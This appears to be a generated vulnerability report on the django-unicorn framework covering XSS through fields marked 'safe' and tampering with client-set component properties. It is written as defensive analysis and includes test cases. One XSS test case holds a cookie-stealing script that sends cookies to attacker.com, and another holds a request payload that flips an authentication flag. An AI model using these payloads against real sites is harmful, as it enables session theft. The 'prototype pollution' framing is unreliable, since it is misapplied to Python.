# Updated Security Vulnerabilities for django-unicorn

After reviewing the provided list according to the specified criteria, here are the vulnerabilities that meet the requirements:

## Cross-Site Scripting (XSS) via HTML Sanitization Bypass

### Description
In versions prior to 0.36.0, django-unicorn didn't encode HTML responses by default, which could lead to cross-site scripting vulnerabilities. While this issue was addressed in version 0.36.0 (as noted in the changelog for CVE-2021-42053), the framework still allows developers to explicitly opt-out of HTML encoding through the `safe` attribute in a component's `Meta` class. If a field is marked as "safe" and contains user-controlled input, this could result in XSS.

### Impact
An attacker could execute arbitrary JavaScript in a victim's browser context if they can inject malicious code into a field that is marked as "safe". This could lead to cookie theft, session hijacking, and other client-side attacks.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- As of v0.36.0, django-unicorn HTML encodes responses by default
- Developers must explicitly opt-in to disable HTML encoding for specific fields

### Missing Mitigations
- No runtime warnings when using `safe` with user-controlled input
- No built-in content security policy recommendations

### Preconditions
1. The application must use a component with fields marked as "safe" in the `Meta` class
2. These "safe" fields must contain user-controlled input

### Source Code Analysis
The vulnerability is rooted in the ability for developers to mark fields as "safe" in a component's `Meta` class:

```python
class SafeExampleView(UnicornView):
    something_safe = ""

    class Meta:
        safe = ("something_safe", )
```

When a field is marked as "safe", django-unicorn will not HTML encode its value before sending it to the client. If an attacker can control the content of `something_safe`, they could inject malicious JavaScript.

For example, if an application has a component that takes user input and stores it in a field marked as "safe":

```python
def save_user_input(self):
    self.something_safe = self.user_input  # self.user_input contains attacker-controlled data
```

When rendered in a template like:

```html
<div>
  {{ something_safe }}  <!-- This will not be HTML encoded -->
</div>
```

If `self.user_input` contains `<script>alert(document.cookie)</script>`, this JavaScript would be executed in the victim's browser.

### Security Test Case
1. Create a component with a field marked as "safe":
   ```python
   class VulnerableComponent(UnicornView):
       user_input = ""
       output = ""

       class Meta:
           safe = ("output",)

       def process_input(self):
           self.output = self.user_input
   ```

2. Create a template that uses this component:
   ```html
   <div>
     <input unicorn:model="user_input" type="text">
     <button unicorn:click="process_input">Process</button>
     <div>{{ output }}</div>
   </div>
   ```

3. As an attacker, input the following into the text field:
   ```
   <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
   ```

4. Click the "Process" button.
5. The script will execute in the victim's browser, sending their cookies to the attacker's server.

## Prototype Pollution through Dynamic Property Setting

### Description
Django-unicorn dynamically sets properties on components based on data received from client requests. If an attacker can manipulate this data, they might be able to set arbitrary properties on component objects, which could lead to prototype pollution or other unexpected behavior.

### Impact
An attacker could potentially modify core functionality of the application, bypass security checks, or inject unexpected behavior. In extreme cases, this could lead to server-side code execution.

### Vulnerability Rank
High

### Currently Implemented Mitigations
- The framework has some validation against setting non-existent properties
- Type checking is performed when possible

### Missing Mitigations
- No comprehensive validation of property names
- No allowlist of safe properties to set

### Preconditions
1. The application must use components with dynamic properties
2. An attacker must be able to manipulate the request data

### Source Code Analysis
In `django_unicorn/components/unicorn_view.py`, the `_set_property` method sets properties on components based on received data:

```python
def _set_property(
    self,
    name: str,
    value: Any,
    *,
    call_updating_method: bool = False,
    call_updated_method: bool = False,
    call_resolved_method: bool = False,
) -> None:
    # Get the correct value type by using the form if it is available
    data = self._attributes()

    value = cast_attribute_value(self, name, value)
    data[name] = value

    # ... type checking and other logic ...

    try:
        setattr(self, name, value)

        # Call hook methods if needed
    except AttributeError:
        raise
```

This property setting is triggered via client requests through the action parsers, as seen in `sync_input.py`:

```python
def handle(component_request: ComponentRequest, component: UnicornView, payload: Dict):
    property_name = payload.get("name")
    property_value = payload.get("value")

    # Logic for determining whether to call resolved methods

    set_property_value(
        component, property_name, property_value, component_request.data, call_resolved_method=call_resolved_method
    )
```

While there are checks to ensure properties exist (through `hasattr`), there's still a risk that an attacker could set sensitive properties that shouldn't be modified by user input, such as internal methods or properties used for security checks.

### Security Test Case
1. Create a component with a security-sensitive property:
   ```python
   class SecureComponent(UnicornView):
       is_authenticated = False
       sensitive_data = "Only for authenticated users"

       def get_data(self):
           if self.is_authenticated:
               return self.sensitive_data
           return "Access denied"
   ```

2. As an attacker, intercept a request to the component and add the sensitive property:
   ```json
   {
     "data": {
       "is_authenticated": true
     }
   }
   ```

3. When the server processes this request, it will set `is_authenticated` to `True`.
4. Subsequent calls to `get_data` will return the sensitive data.
